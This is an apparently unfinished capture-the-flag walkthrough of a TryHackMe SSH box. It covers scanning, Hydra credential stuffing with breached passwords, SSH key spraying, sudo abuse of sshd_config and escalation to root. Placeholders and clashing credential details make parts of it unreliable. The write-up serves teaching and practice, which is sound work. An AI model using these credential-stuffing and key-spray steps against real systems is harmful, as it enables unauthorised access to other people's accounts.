# Just SSH Walkthrough

Insert the box image here

## Overview
### Platform: Tryhackme
### Box Name: Just SSH
### Description: 

---
## Recon and Enumeration (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1595](https://attack.mitre.org/techniques/T1595/)                       | Active Scanning               | NMAP                        |
| [T1592](https://attack.mitre.org/techniques/T1592/)                       | Gather Victim Host Information | ssh                       |
| [T1591](https://attack.mitre.org/techniques/T1591/)                       | Gather Vicitm Org Information | ssh -v |
| [T1589](https://attack.mitre.org/techniques/T1589/)                       | Gather Victim Identify Information | Breached Creds, Personnel Roster |

### Enumeration
Run NMAP to discover what ports are open on the target:
```bash
sudo nmap $ip -Pn -n -oA discScan
```
```bash         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 00:41 EST
Nmap scan report for 10.10.43.128
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
```
Use SSH's debug mode to identify the pertinent information to the server:  
- protocol
- Version of SSH  
- Banner Information (if present)  
- Authentication Methods  
- Acceptable Keys for Authentication


```bash
ssh -v $ip
```
```bash
debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
debug1: SSH2_MSG_SERVICE_ACCEPT received

**************************************************************************
*                           Nexora Solutions                             *
*                    Secure Shell (SSH) Access Portal                    *
**************************************************************************

NOTICE: This system is for authorized use only. Unauthorized access or use 
is prohibited and may result in disciplinary action and/or civil and 
criminal penalties. All activities on this system are monitored and 
recorded. 

For assistance, contact:
  support@nexora-solutions.com
  j_davis@nexora-solutions.com

debug1: Authentications that can continue: publickey,password
debug1: Will attempt key: /home/not-root/.ssh/id_rsa 
debug1: Will attempt key: /home/not-root/.ssh/id_ecdsa 
debug1: Will attempt key: /home/not-root/.ssh/id_ecdsa_sk 
debug1: Will attempt key: /home/not-root/.ssh/id_ed25519 
debug1: Will attempt key: /home/not-root/.ssh/id_ed25519_sk 
debug1: Will attempt key: /home/not-root/.ssh/id_xmss 

```
What we know:  
- Authentication Methods: Publickey and Password  
- Possible Naming Convention: j_davis = f_last

What we have:  
- Personnel Roster: Task 1  
- Breached Credentials: Task 2  

What we can do:  
- Credential Stuffing

---
---
## Initial Access (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1078](https://attack.mitre.org/techniques/T1078/)    | Valid Accounts    |  Hydra, SSH  |
| [T1110](https://attack.mitre.org/techniques/T1110/004/)   |  Credential Stuffing   |  Hydra   |
| [T1110](https://attack.mitre.org/techniques/T1110/002/)   | Password Cracking   | ssh2john, john/hashcat  |

### Crafting the Credential Stuffing Attack
Make a users.txt list which reflects the naming convention found on the SSH Banner:  
f_lastName  

  
```bash
j_davis
b_harris
l_jackson
c_thomas
e_Anderson
d_white
a_garcia
j_smith
j_moore
m_brown
m_martin
s_miller
p_martinez
d_wilson
e_johnson
r_taylor
j_thompson
```

With our users.txt and the breached credentials list, we can initiate the Credential Stuffing attack.  
```bash
hydra -L users.txt -P breachedCreds.txt $ip ssh
```

  ```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 01:49:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 119 login tries (l:17/p:7), ~8 tries per task
[DATA] attacking ssh://10.10.43.128:22/
[22][ssh] host: 10.10.43.128   login: j_moore   password: Unplanned8@Chair
[22][ssh] host: 10.10.43.128   login: m_brown   password: resetMeAfter1Use!*
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 01:50:07
```


### Initial Foothold
Executed a credential stuffing attack utilizing the identifed users, and breached passwords.
```bash
hydra -L users.txt -P breachedCreds.txt $ip ssh
```

SSH Password credentials identified: j_moore : somePassword123
---
---
## Lateral Movement (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1021](https://attack.mitre.org/techniques/T1021/004/)    | Remote Services    | SSH    |
| [T1552](https://attack.mitre.org/techniques/T1552/)    | Unsecured Credentials    | Manual Enumeration / LinPEAS.sh    |
| [T1110](https://attack.mitre.org/techniques/T1110/003/)    | Password Spraying    | NMAP Scripting Engine    |

### j_moore to sftp
j_moore's profile had exisitng id_rsa private and pub keys. The private key was sprayed
against all the users found in the /home direcotory. With the created user list and
the private key, use nmap to conduct a key spray attack.

```bash
ls /home > allUsers.txt
```

```bash
sudo nmap some long argument
```

The nmap scan identifies an additional account that can be accessed via j_moore's id_rsa, the sftp 
account. Confirm the credentials by logging into the sftp service.
```bash
sftp -i id_rsa sftp@$ip
```
enter the passphrase for j_moore's id_rsa, and check your id.
---
---

## Privilege Escalation (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1548](https://attack.mitre.org/techniques/T1548/003/)    | Abuse Elevation Control Mechanism    | Sudo Privileges
| [T1556](https://attack.mitre.org/techniques/T1556/)    | Modify Authentication Process    | /etc/ssh/sshd_config
| [T1110](https://attack.mitre.org/techniques/T1110/004/)    | Credential Stuffing    | hydra    |


### sftp to net-admin
With valid credentials we can enumerate the sftp service and sift through the documents for pertinent 
information. There are two particular documents that indicate a likely attack vector. blah blah blah

```bash
cd /uploads/.tempKeys
get *
```

Given the information from the support tickets, b_harris is a good starting point to conduct a 
key spray attack with. First, set the permissions of b_harris id_rsa:

```bash
chmod 600 id_rsa_harris
```

```bash
sudo nmap long command
```

The key-spray provides access to an additional account, the net-admin.

### net-admin to sys-admin

Now that we have compromised the net-admin account, we can begin the recon and enumeration of the
newly acquired account. A common check is to see what sudo privs a user has:

```bash
sudo -l
```

The net-admin has the ability to start, stop, restart, check status, and edit the sshd_config file. 
Given our permissions, lets see what the current configuration of the ssh server is:

```bash
sudo /usr/bin/vim /etc/ssh/sshd_config
```

The match blocks at the bottom do not allow password logins, only id_rsa. With the keys we have already,
we have reached a dead end. However, we still have breached credentials we can test agains the net-admin, and
sys-admin accounts. Lets see change the server settings so we can execute more credential stuffing attacks:

```bash
passwordAuthentication yes
```

Using the breached password list, conduct a credential stuffing attack against the net-admin and sys-admin
accounts.

```bash
hydar -L admins.txt -P breachedPWD.txt $ip ssh
```

Now we have more credentials, and they belong to the sys-admin account. Log into the account and check your id
and privileges.

```bash
id
sudo -l
```

Paydirt! Sys-admin has no password for sudo, which means we have completely compromised the account. Switch the
user to root and collect your flag.

```bash
sudo su
id
```
